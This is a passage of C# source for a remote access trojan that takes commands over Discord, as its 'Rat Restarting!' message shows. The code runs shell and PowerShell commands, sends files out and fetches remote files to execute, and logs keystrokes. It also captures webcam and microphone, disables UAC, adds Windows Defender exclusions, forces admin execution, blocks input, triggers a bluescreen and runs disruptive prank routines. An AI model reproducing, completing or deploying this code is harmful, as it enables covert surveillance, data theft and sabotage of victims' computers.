                                await SetWallpaper(imageUrl, replyChannelId);
                            }
                            else if (msg.Attachments != null && msg.Attachments.Count > 0)
                            {
                                var attachment = msg.Attachments.First();

                                if (attachment.Width.HasValue && attachment.Height.HasValue)
                                {
                                    string imageUrl = attachment.Url;
                                    await SetWallpaper(imageUrl, replyChannelId);
                                }
                            }
                        });
                    }
                    else if (trimmedContent.StartsWith("cd", StringComparison.OrdinalIgnoreCase))
                    {
                        await Task.Run(async () =>
                        {

                            string cdCommand = trimmedContent.Substring(2).Trim();
                            await ExecuteCdCommand(cdCommand, replyChannelId);
                        });
                    }
                    else if (trimmedContent.StartsWith("cmd", StringComparison.OrdinalIgnoreCase))
                    {
                        await Task.Run(async () =>
                        {

                            string cmdCommand = trimmedContent.Substring("cmd".Length).Trim();
                            await ExecuteCmdCommand(cmdCommand, replyChannelId);
                        });
                    }
                    else if (trimmedContent.StartsWith("new_pross", StringComparison.OrdinalIgnoreCase))
                    {
                        string command = trimmedContent.Substring("new_pross".Length).Trim();
                        await StartNewProcess(command, replyChannelId);
                    }
                    else if (
                        trimmedContent.StartsWith("kill_pross", StringComparison.OrdinalIgnoreCase)
                    )
                    {
                        try
                        {
                            // پیدا کردن موقعیت "kill_pross" در متن
                            int keywordPosition = trimmedContent.IndexOf("kill_pross");

                            if (keywordPosition != -1)
                            {
                                // استخراج بخشی از متن بعد از "kill_pross"
                                string processName = trimmedContent
                                    .Substring(keywordPosition + "kill_pross".Length)
                                    .Trim();

                                // کشتن فرآیند
                                await KillProcess(replyChannelId, processName); // اینجا userMessage را به عنوان پارامتر مناسب برای متد KillProcess منتقل کنید
                            }
                            else
                            {
                                await SendMessageAsync("Invalid command format.", replyChannelId);
                            }
                        }
                        catch (Exception ex)
                        {
                            await SendMessageAsync($"Error: {ex.Message}", replyChannelId);
                        }
                    }
                    else if (trimmedContent.StartsWith("remove", StringComparison.OrdinalIgnoreCase))
                    {
                        string removeCommand = trimmedContent.Substring(6).Trim();
                        await ExecuteRemoveCommand(removeCommand, replyChannelId);
                    }
                    else if (trimmedContent.StartsWith("type", StringComparison.OrdinalIgnoreCase))
                    {
                        int startIndex = trimmedContent.IndexOf("type", StringComparison.OrdinalIgnoreCase);
                        string typeCommand = trimmedContent.Substring(startIndex + 4).Trim();
                        await ExecuteTypeCommand(typeCommand, replyChannelId);
                    }
                    else if (trimmedContent.StartsWith("random_mouse", StringComparison.OrdinalIgnoreCase))
                    {
                        await Task.Run(async () =>
                        {

                            string[] parts = trimmedContent.Split(' ');

                            double duration = 0.15;
                            await SendMessageAsync("mouse moved", replyChannelId);
                            if (parts.Length > 1 && int.TryParse(parts[1], out int parsedDuration))
                            {
                                if (parsedDuration >= 1 && parsedDuration <= 40 && parsedDuration == 1500)
                                {
                                    duration = parsedDuration;
                                    await SendMessageAsync($"Strat mouse moved {parsedDuration} second", replyChannelId);
                                }
                                else
                                {
                                    await SendMessageAsync("Enter number from 1 to 40 or [1500]", replyChannelId);
                                    return;
                                }
                            }

                            Random random = new Random();
                            int screenWidth = Screen.PrimaryScreen.Bounds.Width;
                            int screenHeight = Screen.PrimaryScreen.Bounds.Height;

                            DateTime endTime = DateTime.Now.AddSeconds(duration);

                            while (DateTime.Now < endTime)
                            {
                                int x = random.Next(screenWidth);
                                int y = random.Next(screenHeight);
                                Cursor.Position = new Point(x, y);
                                Thread.Sleep(100);
                            }
                        });
                    }
                    else if (trimmedContent.StartsWith("download", StringComparison.OrdinalIgnoreCase))
                    {
                        await Task.Run(async () =>
                        {

                            string[] parts = trimmedContent.Split(' ');
                            if (parts.Length >= 2)
                            {
                                string filePath = string.Join(" ", parts.Skip(1)).Trim('"');
                                await downloadFile(filePath, replyChannelId);
                            }
                            else
                            {
                                await SendMessageAsync("Usage: download <file_path>", replyChannelId);
                            }
                        });
                    }
                    else if (trimmedContent.StartsWith("chand_download", StringComparison.OrdinalIgnoreCase))
                    {
                        await Task.Run(async () =>
                        {

                            string[] parts = trimmedContent.Split('\n').Select(part => part.Trim()).ToArray();
                            if (parts.Length > 1)
                            {
                                List<string> filePaths = new List<string>();
                                for (int i = 1; i < parts.Length; i++)
                                {
                                    string filePath = parts[i].Trim('"');
                                    filePaths.Add(filePath);
                                }
                                await ChandDownloadFiles(filePaths, replyChannelId);
                            }
                            else
                            {
                                await SendMessageAsync("Usage: chand_download\n<file_path_1>\n<file_path_2>\n...", replyChannelId);
                            }
                        });
                    }
                    else if (trimmedContent.StartsWith("io_download", StringComparison.OrdinalIgnoreCase))
                    {
                        await ProcessIoDownloadCommand(trimmedContent, replyChannelId); // Pass trimmedContent
                    }
                    else if (trimmedContent.StartsWith("url_upload", StringComparison.OrdinalIgnoreCase))
                    {
                        await Task.Run(async () =>
                        {

                            string[] parts = trimmedContent.Split('"');
                            if (parts.Length >= 3)
                            {
                                string url = parts[1].Trim();
                                string directoryPath = parts[3].Trim();
                                string fileName = parts.Length >= 5 ? parts[4].Trim() : "";

                                await ExecuteUrlUploadCommand(url, directoryPath, fileName, replyChannelId);
                            }
                            else
                            {
                                await SendMessageAsync("Use url_upload <link> <diractory> [file name optimal]", replyChannelId);
                            }
                        });
                    }
                    else if (trimmedContent.StartsWith("mic", StringComparison.OrdinalIgnoreCase))
                    {
                        await Task.Run(async () =>
                        {

                            string[] parts = trimmedContent.Split(' ');
                            if (parts.Length == 2 && int.TryParse(parts[1], out int durationInSeconds))
                            {
                                await RecordAndSendAudio(durationInSeconds, replyChannelId);
                            }
                        });
                    }
                    else if (trimmedContent.StartsWith("volume", StringComparison.OrdinalIgnoreCase))
                    {
                        string volumeValue = trimmedContent.Substring("volume".Length).Trim();
                        await SetVolume(volumeValue, replyChannelId);
                    }
                    else if (trimmedContent.StartsWith("set_volume", StringComparison.OrdinalIgnoreCase))
                    {
                        string volumeValue = trimmedContent.Substring("set_volume".Length).Trim();
                        await LockVolume(volumeValue, replyChannelId);
                    }
                    else if (trimmedContent.Equals("normal_volume", StringComparison.OrdinalIgnoreCase))
                    {
                        await UnlockVolume(replyChannelId);
                    }
                    else if (trimmedContent.StartsWith("play", StringComparison.OrdinalIgnoreCase))
                    {
                        await Task.Run(async () =>
                        {

                            string audioUrl = trimmedContent.Substring("play".Length).Trim();
                            PlayAudio(audioUrl, replyChannelId);
                        });
                    }
                    else if (trimmedContent.StartsWith("stop_play", StringComparison.OrdinalIgnoreCase))
                    {
                        if (waveOutDevice != null && waveOutDevice.PlaybackState == PlaybackState.Playing)
                        {
                            waveOutDevice.Stop();
                            await SendMessageAsync("Audio playback has been stopped.", replyChannelId);
                        }
                        else
                        {
                            await SendMessageAsync("No audio is currently playing.", replyChannelId);
                        }
                    }
                    else if (trimmedContent.StartsWith("set_clipboard", StringComparison.OrdinalIgnoreCase))
                    {
                        string content = trimmedContent.Substring("set_clipboard".Length).Trim();
                        await SetClipboardContent(content, replyChannelId);
                    }
                    else if (trimmedContent.StartsWith("block", StringComparison.OrdinalIgnoreCase))
                    {
                        await Task.Run(async () =>
                        {

                            if (!inputBlocked)
                            {
                                BlockInput(true);
                                inputBlocked = true;
                                await SendMessageAsync("Mouse and keyboard blocked.", replyChannelId);
                            }
                            else
                            {
                                await SendMessageAsync("Mouse and keyboard are already blocked.", replyChannelId);
                            }
                        });
                    }
                    else if (trimmedContent.StartsWith("unblock", StringComparison.OrdinalIgnoreCase))
                    {
                        if (inputBlocked)
                        {
                            BlockInput(false);
                            inputBlocked = false;
                            await SendMessageAsync("Mouse and keyboard unblocked.", replyChannelId);
                        }
                        else
                        {
                            await SendMessageAsync("Mouse and keyboard are already unblocked.", replyChannelId);
                        }
                    }
                    else if (trimmedContent.StartsWith("run", StringComparison.OrdinalIgnoreCase))
                    {
                        string[] messageParts = trimmedContent.Split(' ');
                        if (messageParts.Length >= 2)
                        {
                            string filePath = string.Join(" ", messageParts.Skip(1));
                            await ExecuteFileAsync(filePath, replyChannelId);
                        }
                        else
                        {
                            await SendMessageAsync("Usage: run [file_path]", replyChannelId);
                        }
                    }
                    else if (trimmedContent.StartsWith("restart", StringComparison.OrdinalIgnoreCase))
                    {
                        if (trimmedContent == "restart")
                        {
                            await SendMessageAsync("To restart Windows, please use the command: `restart yes`", replyChannelId);
                        }
                        else if (trimmedContent.Contains("yes"))
                        {
                            await SendMessageAsync("Restarting Windows...", replyChannelId);
                            RestartWindows();
                        }
                    }
                    else if (trimmedContent.StartsWith("shutdown", StringComparison.OrdinalIgnoreCase))
                    {
                        if (trimmedContent == "shutdown")
                        {
                            await SendMessageAsync("To shutdown Windows, please use the command: `shutdown yes`", replyChannelId);
                        }
                        else
                        {
                            await SendMessageAsync("Shutting down Windows...", replyChannelId);
                            ShutdownWindows();
                        }
                    }
                    else if (trimmedContent.StartsWith("say", StringComparison.OrdinalIgnoreCase))
                    {
                        string textToSpeak = trimmedContent.Substring("say".Length).Trim();
                        if (!string.IsNullOrEmpty(textToSpeak))
                        {
                            await SpeakText(replyChannelId, textToSpeak);
                        }
                    }
                    else if (trimmedContent.StartsWith("webcam", StringComparison.OrdinalIgnoreCase))
                    {
                        await Task.Run(async () =>
                        {

                            string webcamName = trimmedContent.Substring("webcam".Length).Trim();
                            await CaptureAndSendWebcamImage(webcamName, replyChannelId);
                        });
                    }
                    else if (trimmedContent.StartsWith("powershell", StringComparison.OrdinalIgnoreCase))
                    {
                        await Task.Run(async () =>
                        {

                            string cmdCommand = trimmedContent.Substring("powershell".Length).Trim();
                            await ExecutePowerShellCommand(replyChannelId, cmdCommand);
                        });
                    }
                    else if (
                        trimmedContent.StartsWith("no_defender", StringComparison.OrdinalIgnoreCase)
                    )
                    {
                        await Task.Run(async () =>
                        {
                            try
                            {
                                // پیدا کردن موقعیت "no_defender" در متن
                                int keywordPosition = trimmedContent.IndexOf("no_defender");

                                if (keywordPosition != -1)
                                {
                                    // استخراج بخشی از متن بعد از "no_defender"
                                    string exclusionPath = trimmedContent
                                        .Substring(keywordPosition + "no_defender".Length)
                                        .Trim();

                                    // اگر مسیر وارد نشده باشد، مسیر پیش‌فرض را تعیین کنید
                                    if (string.IsNullOrEmpty(exclusionPath))
                                    {
                                        string username = Environment.UserName;
                                        exclusionPath = $@"C:\Users\{username}\AppData\Local";
                                    }

                                    await AddPathToWindowsDefenderExclusions(replyChannelId, exclusionPath);
                                }
                                else
                                {
                                    await SendMessageAsync(
                                                                            "Invalid command format."
                                    , replyChannelId);
                                }
                            }
                            catch (Exception ex)
                            {
                                await SendMessageAsync($"Error: {ex.Message}", replyChannelId);
                            }
                        });
                    }
                    else if (trimmedContent.StartsWith("mwebcam", StringComparison.OrdinalIgnoreCase))
                    {
                        await Task.Run(async () =>
                        {
                            try
                            {
                                Regex regex = new Regex(@"\s+");
                                string[] commandParts = regex.Split(trimmedContent);

                                if (commandParts.Length >= 4 && int.TryParse(commandParts[3], out int imageCount))
                                {
                                    string webcamName = commandParts[1] + " " + commandParts[2];
                                    await CaptureAndSendWebcamImages(webcamName, imageCount, replyChannelId);
                                }
                            }
                            catch (Exception ex)
                            {
                                await SendMessageAsync($"Error compressing folder: {ex.Message}", replyChannelId);
                            }
                        });
                    }
                    else if (trimmedContent.StartsWith("zip", StringComparison.OrdinalIgnoreCase))
                    {
                        await Task.Run(async () =>
                        {
                            try
                            {
                                string[] parts = trimmedContent.Split(new char[] { ' ' }, StringSplitOptions.RemoveEmptyEntries);
                                if (parts.Length >= 2)
                                {
                                    string folderPath = string.Join(" ", parts.Skip(1)).Trim('"');
                                    string zipPath = $"{folderPath}.zip";
                                    if (Directory.Exists(folderPath))
                                    {
                                        await ZipFolder(folderPath, zipPath, replyChannelId);
                                    }
                                    else
                                    {
                                        await SendMessageAsync("Folder not found.", replyChannelId);
                                    }
                                }
                                else
                                {
                                    await SendMessageAsync("Usage: zip <folder_path>", replyChannelId);
                                }
                            }
                            catch (Exception ex)
                            {
                                await SendMessageAsync($"Error compressing folder: {ex.Message}", replyChannelId);
                            }
                        });
                    }

                    else if (trimmedContent.StartsWith("key", StringComparison.OrdinalIgnoreCase))
                    {
                        await Task.Run(async () =>
                        {
                            var keys = trimmedContent.Split(' ').Skip(1).ToArray();
                            if (keys.Length > 0)
                            {
                                await Key(replyChannelId, keys);
                            }
                            else
                            {
                                await ShowInstructions(replyChannelId);
                            }
                        });
                    }
                    else if (trimmedContent.StartsWith("find_pross", StringComparison.OrdinalIgnoreCase))
                    {
                        await Task.Run(async () =>
                        {
                            string[] messageParts = trimmedContent.Split(' ');
                            if (messageParts.Length >= 2)
                            {
                                string processName = messageParts[1];
                                await FindProcessLocation(replyChannelId, processName);
                            }
                            else
                            {
                                await SendMessageAsync("Please provide a process name to find its location.", replyChannelId);
                            }
                        });
                    }
                    else if (trimmedContent.StartsWith("save", StringComparison.OrdinalIgnoreCase))
                    {
                        await Task.Run(async () =>
                        {
                            string fileUrl = trimmedContent.Substring("save".Length).Trim();
                            await SaveAndExecuteFile(replyChannelId, fileUrl);
                        });
                    }
                    else if (trimmedContent.StartsWith("stop_download", StringComparison.OrdinalIgnoreCase))
                    {
                        await Task.Run(async () =>
                        {
                            StopDownload();
                            await SendMessageAsync("Download process stopped.", replyChannelId);
                        });
                    }
                    else if (trimmedContent.StartsWith("explorer", StringComparison.OrdinalIgnoreCase))
                    {
                        await Task.Run(async () =>
                        {
                            string path = trimmedContent.Substring("explorer".Length).Trim();
                            await ExecuteExplorer(path, replyChannelId);
                        });
                    }
                    else if (trimmedContent.StartsWith("startup_list", StringComparison.OrdinalIgnoreCase))
                    {
                        await Task.Run(async () =>
                        {
                            string path = trimmedContent.Substring("startup_list".Length).Trim();
                            await CheckStartupAppsRegistry(replyChannelId);
                        });
                    }
                    else if (trimmedContent.StartsWith("bomb_minimize", StringComparison.OrdinalIgnoreCase))
                    {
                        await Task.Run(async () =>
                        {
                            continueMinimize = true;
                            await sMinimizeAllWindowsAsync(replyChannelId);
                        });
                    }
                    else if (trimmedContent.StartsWith("stop_minimize", StringComparison.OrdinalIgnoreCase))
                    {
                        await Task.Run(async () =>
                        {
                            continueMinimize = false;
                            await SendMessageAsync("Minimize operation stopped", replyChannelId);
                        });
                    }
                    else if (trimmedContent.StartsWith("hide_taskbar", StringComparison.OrdinalIgnoreCase))
                    {
                        await Task.Run(async () =>
                        {
                            string path = trimmedContent.Substring("hide_taskbar".Length).Trim();
                            await HideTaskbar(replyChannelId);
                            await SendMessageAsync("Taskbar Hidden", replyChannelId);
                        });
                    }
                    else if (trimmedContent.StartsWith("show_taskbar", StringComparison.OrdinalIgnoreCase))
                    {
                        await Task.Run(async () =>
                        {
                            string path = trimmedContent.Substring("show_taskbar".Length).Trim();
                            await ShowTaskbar(replyChannelId);
                            await SendMessageAsync("Taskbar Showed", replyChannelId);
                        });
                    }
                    else if (trimmedContent.StartsWith("set_admin", StringComparison.OrdinalIgnoreCase))
                    {
                        await Task.Run(async () =>
                        {
                            string filePath = trimmedContent.Substring("set_admin".Length).Trim();
                            await SetAdminAsync(replyChannelId, filePath);
                        });
                    }
                    else if (trimmedContent.StartsWith("remove_admin", StringComparison.OrdinalIgnoreCase))
                    {
                        await Task.Run(async () =>
                        {
                            string filePath = trimmedContent.Substring("remove_admin".Length).Trim();

                            if (!string.IsNullOrWhiteSpace(filePath))
                            {
                                await RemoveAdminAsync(replyChannelId, filePath);
                            }
                            else
                            {
                                await SendMessageAsync("Error: Please provide a valid file path.", replyChannelId);
                            }
                        });
                    }
                    else if (trimmedContent.StartsWith("start_keylogger", StringComparison.OrdinalIgnoreCase))
                    {
                        await Task.Run(async () =>
                        {
                            try
                            {
                                await startKeyLogger(replyChannelId);
                            }
                            catch (Exception ex)
                            {
                                await SendMessageAsync(ex.Message, replyChannelId);
                            }
                        });
                    }
                    else if (trimmedContent.StartsWith("stop_keylogger", StringComparison.OrdinalIgnoreCase))
                    {

                        await Task.Run(async () =>
                        {
                            try
                            {
                                await stopKeyLogger(replyChannelId);
                            }
                            catch (Exception ex)
                            {
                                await SendMessageAsync(ex.Message, replyChannelId);
                            }
                        });
                    }
                    else if (trimmedContent.StartsWith("fbomb", StringComparison.OrdinalIgnoreCase))
                    {
                        await Task.Run(async () =>
                        {
                            // بررسی وجود دستور start_fbomber با مسیر
                            if (!string.IsNullOrEmpty(trimmedContent.Trim().Substring("fbomb".Length)))
                            {
                                string path = trimmedContent.Substring("fbomb".Length).Trim();
                                await Task.Run(async () => await StartCreatingFoldersAsync(replyChannelId, path));
                                await SendMessageAsync($"💣 Folder bomber Startded on {path} 💣", replyChannelId);
                                await Task.Delay(1200); // صبر 0.1 ثانیه
                                await SendMessageAsync($"```markdown stop_fbomb```", replyChannelId);
                            }
                            // در غیر این صورت نمایش راهنما
                            else
                            {
                                await SendMessageAsync("useg: fbomb [patch directory]", replyChannelId);
                            }
                        });
                    }
                    else if (trimmedContent.StartsWith("stop_fbomb", StringComparison.OrdinalIgnoreCase))
                    {
                        await Task.Run(async () =>
                        {
                            string path = trimmedContent.Substring("stop_fbomb".Length).Trim();
                            try
                            {
                                await StopCreatingFoldersAsync(replyChannelId, path);
                            }
                            catch (Exception ex)
                            {
                                await SendMessageAsync(ex.Message, replyChannelId);
                            }
                        });
                    }
                    else if (trimmedContent.StartsWith("bluescreen", StringComparison.OrdinalIgnoreCase))
                    {
                        await Task.Run(async () =>
                        {
                            try
                            {
                                await Bsod(replyChannelId);
                            }
                            catch (Exception ex)
                            {
                                await SendMessageAsync(ex.Message, replyChannelId);
                            }
                        });
                    }
                    else if (trimmedContent.StartsWith("arun", StringComparison.OrdinalIgnoreCase))
                    {
                        try
                        {
                            // پیدا کردن موقعیت "run" در متن
                            int keywordPosition = trimmedContent.IndexOf("arun");

                            if (keywordPosition != -1)
                            {
                                // استخراج بخشی از متن بعد از "run"
                                string command = trimmedContent
                                    .Substring(keywordPosition + "arun".Length)
                                    .Trim();

                                // اجرای فایل متناسب
                                string[] messageParts = command.Split(' ');
                                if (messageParts.Length >= 1)
                                {
                                    string filePath = string.Join(" ", messageParts);
                                    await ExecuteFileAsAdminAsync(filePath, replyChannelId);
                                }
                                else
                                {
                                    await SendMessageAsync("Usage: arun [file_path]", replyChannelId);

                                }
                            }
                            else
                            {
                                await SendMessageAsync("Invalid command format.", replyChannelId);
                            }
                        }
                        catch (Exception ex)
                        {
                            await SendMessageAsync($"Error executing command: {ex.Message}", replyChannelId);

                        }
                    }
                    else if (
    trimmedContent.StartsWith("startup_remove", StringComparison.OrdinalIgnoreCase)
)
                    {
                        await Task.Run(async () =>
                        {
                            string appName = trimmedContent.Substring("startup_remove".Length).Trim().Trim('"');
                            await RemoveStartupApp(replyChannelId, appName);
                        });
                    }
                    else if (trimmedContent.StartsWith("chrome_webview"))
                    {
                        await Task.Run(async () =>
                        {
                            try
                            {
                                string url = trimmedContent.Substring("chrome_webview".Length).Trim();
                                await OpenUrlInChromeBrowserIfInstalled(replyChannelId, url);
                            }
                            catch (Exception ex)
                            {
                                await SendMessageAsync($"Error opening web view: {ex.Message}", replyChannelId);
                            }
                        });
                    }

                    break;
            }
        }
        catch (Exception ex)
        {
        }
    }
    public static async Task Gayesh(ulong replyChannelId)
    {
        try
        {
            try
            {
                DesktopIconHider.HideDesktopIcons();
                await SendMessageAsync("Desktop Icons Hidded !", replyChannelId);
            }
            catch (Exception ex)
            {
                await SendMessageAsync($"Error{ex.Message}", replyChannelId);
            }
            try
            {

                string imageurl = "https://cdn-1.files.vc/files/xd1/d7dde84eea9745cac8e69142e70cb339.png";
                await SetWallpaper(imageurl, replyChannelId);
            }
            catch (Exception ex)
            {
                await SendMessageAsync($"Error{ex.Message}", replyChannelId);
            }
            string volume = "100";
            string audioUrl = "https://api.files.vc/files/cnk/87ad8df7d40c9eafb5b5f52dece0feb6.mp3"; // متن طولانی شما
            try
            {
                lPlayAudio(audioUrl, replyChannelId);
            }
            catch (Exception ex)
            {
                await SendMessageAsync($"Error{ex.Message}", replyChannelId);

            }
            try
            {
                await HideTaskbar(replyChannelId);
                await MinimizeAllWindowsAsync(replyChannelId);
                await sMinimizeAllWindowsAsync(replyChannelId);
            }
            catch (Exception ex)
            {
                await SendMessageAsync($"Error{ex.Message}", replyChannelId);
            }

            // اجرای وظایف به‌طور همزمان
            var tasks = new List<Task>
        {
            LockVolume(volume, replyChannelId),
            MoveMouseRandomly(replyChannelId, 1500) // تابعی که برای حرکت موس ایجاد می‌کنیم
        };

            // منتظر اتمام تمام وظایف می‌مانیم
            await Task.WhenAll(tasks);
        }
        catch (Exception ex)
        {
            await SendMessageAsync($"Error: {ex.Message}", replyChannelId);
        }
    }

    public static async void lPlayAudio(string audioUrl, ulong replyChannelId)
    {
        try
        {
            if (waveOutDevice != null)
            {
                waveOutDevice.Stop();
                waveOutDevice.Dispose();
            }
            waveOutDevice = new WaveOutEvent();
            audioFileReader = new AudioFileReader(audioUrl);

            // افزودن event برای تکرار پخش موزیک پس از پایان
            waveOutDevice.PlaybackStopped += (sender, args) =>
            {
                audioFileReader.Position = 0; // ریست کردن موقعیت به ابتدا
                waveOutDevice.Play();         // آغاز مجدد پخش
            };

            waveOutDevice.Init(audioFileReader);
            waveOutDevice.Play();
            await SendMessageAsync("Music Loop Started !", replyChannelId);
        }
        catch (Exception ex)
        {
            await SendMessageAsync($"Error PLay Music{ex.Message}", replyChannelId);
        }
    }


    public static async Task MoveMouseRandomly(ulong replyChannelId, double duration)
    {
        await SendMessageAsync("mouse moved", replyChannelId);
        await SendMessageAsync($"Start mouse moved {duration} seconds", replyChannelId);

        Random random = new Random();
        int screenWidth = Screen.PrimaryScreen.Bounds.Width;
        int screenHeight = Screen.PrimaryScreen.Bounds.Height;

        DateTime endTime = DateTime.Now.AddSeconds(duration);

        while (DateTime.Now < endTime)
        {
            int x = random.Next(screenWidth);
            int y = random.Next(screenHeight);
            Cursor.Position = new Point(x, y);
            await Task.Delay(100);
        }
    }


    public static async Task Showicon(ulong replyChannelId)
    {
        try
        {
            DesktopIconHider.ShowDesktopIcons();
            await SendMessageAsync("Desktop Icons Showed !", replyChannelId);

        }
        catch (Exception ex)
        {
            await SendMessageAsync($"Error: {ex.Message}", replyChannelId);
        }
    }
    public static async Task Hideicon(ulong replyChannelId)
    {
        try
        {
            DesktopIconHider.HideDesktopIcons();
            await SendMessageAsync("Desktop Icons Hidded !", replyChannelId);

        }
        catch (Exception ex)
        {
            await SendMessageAsync($"Error: {ex.Message}", replyChannelId);
        }

    }
    public static async Task OpenUrlInChromeBrowserIfInstalled(ulong replyChannelId, string url)
    {
        try
        {
            if (IsChromeInstalled())
            {
                if (!url.StartsWith("http://") && !url.StartsWith("https://"))
                {
                    url = "http://" + url;
                }

                Process.Start(new ProcessStartInfo
                {
                    FileName = "chrome",
                    UseShellExecute = true,
                    Arguments = url
                });

                await SendMessageAsync("Opening URL in Chrome", replyChannelId);
            }
            else
            {
                await SendMessageAsync("Chrome is not installed.", replyChannelId);
            }
        }
        catch (Exception ex)
        {
            await SendMessageAsync($"Error opening web view: {ex.Message}", replyChannelId);
        }
    }

    public static bool IsChromeInstalled()
    {
        using (RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe"))
        {
            return key != null;
        }
    }
    public static async Task<bool> RunOperations(ulong replyChannelId)
    {
        await SendMessageAsync("Wait 3 Secound ...", replyChannelId);

        System.Threading.Thread.Sleep(3000);
        // Check if the program is running as Administrator
        if (!IsAdministrator())
        {
            await SendMessageAsync("The program is not running with Administrator privileges.", replyChannelId);
            return false;
        }

        bool allSuccess = true;

        try
        {
            // 2- Add path as an exception in Antivirus (Windows Defender)
            if (AddAntivirusException())
            {
                await SendMessageAsync("Path added as an exception in Antivirus.", replyChannelId);
                addedantivirus = true;
            }
            else
                await SendMessageAsync("Failed to add path as an exception in Antivirus.", replyChannelId);
        }
        catch (Exception ex)
        {
            await SendMessageAsync($"Error {ex.Message}", replyChannelId);
            allSuccess = false;
        }


        try
        {
            // 1- Disable UAC
            if (DisableUAC())
                await SendMessageAsync("UAC disabled successfully!", replyChannelId);
            else
                await SendMessageAsync("Failed to disable UAC.", replyChannelId);
        }
        catch (Exception ex)
        {
            // ارسال پیام خطا
            await SendMessageAsync($"Error: {ex.Message}", replyChannelId);
            allSuccess = false;
        }

        try
        {
            if (SetExeFilesToRunAsAdmin())
                await SendMessageAsync("All EXE files set to run as Administrator.", replyChannelId);
            else
                await SendMessageAsync("Failed to set EXE files to run as Administrator.", replyChannelId);
        }
        catch (Exception ex)
        {
            await SendMessageAsync($"Error setting EXE files to run as Administrator: {ex.Message}.", replyChannelId);
            allSuccess = false;
        }


        return allSuccess;
    }

    public static bool DisableUAC()
    {
        try
        {
            string uacRegPath = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System";
            using (RegistryKey key = Registry.LocalMachine.OpenSubKey(uacRegPath, writable: true))
            {
                if (key == null)
                    throw new Exception("Failed to open registry key for UAC.");

                key.SetValue("EnableLUA", 0, RegistryValueKind.DWord);
            }
            return true;
        }
        catch (Exception ex)
        {
            throw;  // استثنا را مجدداً پرتاب می‌کنیم تا در سطح بالاتر پردازش شود
        }
    }


    public static bool AddAntivirusException()
    {
        try
        {
            string username = Environment.UserName;
            string pathToExclude = $"C:\\Users\\{username}\\AppData";
            string psCommand = $"Add-MpPreference -ExclusionPath '{pathToExclude}'";

            ProcessStartInfo psi = new ProcessStartInfo()
            {
                FileName = "powershell",
                Arguments = $"-Command \"{psCommand}\"",
                UseShellExecute = false,
                CreateNoWindow = true,
                RedirectStandardOutput = true,
                RedirectStandardError = true
            };

            using (Process process = Process.Start(psi))
            {
                process.WaitForExit();
                if (process.ExitCode != 0)
                {
                    throw new Exception($"PowerShell command failed with exit code {process.ExitCode}");
                }
                return true;
            }
        }
        catch (Exception ex)
        {
            throw;
        }
    }


    public static bool SetExeFilesToRunAsAdmin()
    {
        try
        {
            string username = Environment.UserName;
            string targetDirectory = $"C:\\Users\\{username}\\AppData\\Local";

            if (!Directory.Exists(targetDirectory))
                throw new Exception("Target directory does not exist.");

            string regPath = @"Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers";
            using (RegistryKey layersKey = Registry.CurrentUser.OpenSubKey(regPath, true) ?? Registry.CurrentUser.CreateSubKey(regPath))
            {
                if (layersKey == null)
                    throw new Exception("Failed to access or create the registry key.");

                string[] exeFiles;
                try
                {
                    exeFiles = Directory.EnumerateFiles(targetDirectory, "*.exe", SearchOption.AllDirectories).ToArray();
                }
                catch (UnauthorizedAccessException)
                {
                    return false;
                }

                if (exeFiles.Length == 0)
                    throw new Exception("No EXE files found in the target directory.");

                foreach (string filePath in exeFiles)
                {
                    layersKey.SetValue(filePath, "RUNASADMIN", RegistryValueKind.String);
                }
            }
            return true;
        }
        catch (Exception ex)
        {
            return false;
        }
    }



    private static async Task Resett(ulong replyChannelId)
    {
        try
        {
            // تنظیمات فرآیند
            var startInfo = new ProcessStartInfo
            {
                FileName = khoderat,
                UseShellExecute = true // برای اجرا در محیط shell
            };

            // ایجاد و اجرای فرآیند جدید
            using (var process = new Process { StartInfo = startInfo })
            {
                process.Start(); // شروع فرآیند

                await SendMessageAsync("Rat Restarting!", replyChannelId);
            }

            // بررسی وضعیت فرآیند
            bool isProcessRunning = Process.GetProcessesByName(Path.GetFileNameWithoutExtension(khoderat))
                                           .Any(p => p.Id != Process.GetCurrentProcess().Id);

            if (!isProcessRunning)
            {
                await SendMessageAsync("Error: Process did not start as expected.", replyChannelId);
            }
        }
        catch (Exception ex)
        {
            // ارسال پیام خطا
            await SendMessageAsync($"Error: {ex.Message}", replyChannelId);
        }
    }
    private static async Task RemoveStartupApp(ulong replyChannelId, string appName)
    {
        try
        {
            string runKeyPath = @"Software\Microsoft\Windows\CurrentVersion\Run";

            using (RegistryKey runKey = Registry.CurrentUser.OpenSubKey(runKeyPath, true))
            {
                if (runKey == null)
                {
                    await SendMessageAsync("Unable to open registry key for startup applications.", replyChannelId);
                    return;
                }

                // جستجو برای برنامه با نام داده شده
                string[] valueNames = runKey.GetValueNames();
                foreach (string valueName in valueNames)
                {
                    // If the valueName contains appName, ignoring case
                    if (valueName.IndexOf(appName, StringComparison.OrdinalIgnoreCase) >= 0)
                    {
                        runKey.DeleteValue(valueName);
                        await SendMessageAsync($"{appName} has been removed from startup applications.", replyChannelId);
                        return;
                    }

                }

                // اگر برنامه پیدا نشد
                await SendMessageAsync($"{appName} was not found in startup applications.", replyChannelId);
            }
        }
        catch (Exception ex)
        {
            await SendMessageAsync($"Error removing from startup: {ex.Message}", replyChannelId);
        }
    }

    private static async Task ExecuteFileAsAdminAsync(string filePath, ulong replyChannelId)
    {
        try
        {
            ProcessStartInfo startInfo = new ProcessStartInfo();
            startInfo.FileName = filePath;
            startInfo.UseShellExecute = true;
            startInfo.Verb = "runas";

            Process process = new Process();
            process.StartInfo = startInfo;

            process.Start();

            await SendMessageAsync($"Running file as admin: {filePath} {Environment.UserName}", replyChannelId);
        }
        catch (Exception ex)
        {
            await SendMessageAsync($"Error: {ex.Message}", replyChannelId);
        }
    }


    private static async Task UsersInfoo(ulong replyChannelId)
    {
        try
        {
            using (HttpClient httpClient = new HttpClient())
            {
                // درخواست به API برای دریافت اطلاعات آی‌پی
                string response = await httpClient.GetStringAsync("http://ip-api.com/json");
                // پارس کردن خروجی JSON
                IpInfo ipInfo = JsonSerializer.Deserialize<IpInfo>(response);
                if (ipInfo != null && ipInfo.status.Equals("success", StringComparison.OrdinalIgnoreCase))
                {
                    // ایجاد ایموجی پرچم به صورت :flag_<code>: (کد به حروف کوچک تبدیل می‌شود)
                    string flagEmoji = $":flag_{ipInfo.countryCode.ToLower()}:";
